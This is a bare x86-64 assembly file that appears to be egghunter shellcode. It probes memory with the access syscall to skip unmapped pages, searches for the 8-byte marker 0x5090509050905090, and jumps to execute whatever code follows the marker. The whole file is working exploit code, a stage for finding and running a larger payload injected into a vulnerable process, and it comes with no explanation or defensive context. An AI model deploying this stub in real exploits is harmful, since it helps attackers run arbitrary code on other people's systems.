global _start

_start:

	xor edi, edi
	xor esi, esi
	lea rdi, [rel $ -10000]
	
_increase1:
	or di, 0xfff
	
_increase2:
	inc rdi 

_search:
	push 21 
	pop rax
	syscall
	cmp al, 0xf2
	je _increase1
	mov r12, 0x5090509050905090
	cmp r12, [rdi] 
	jne _increase2
	jmp rdi	



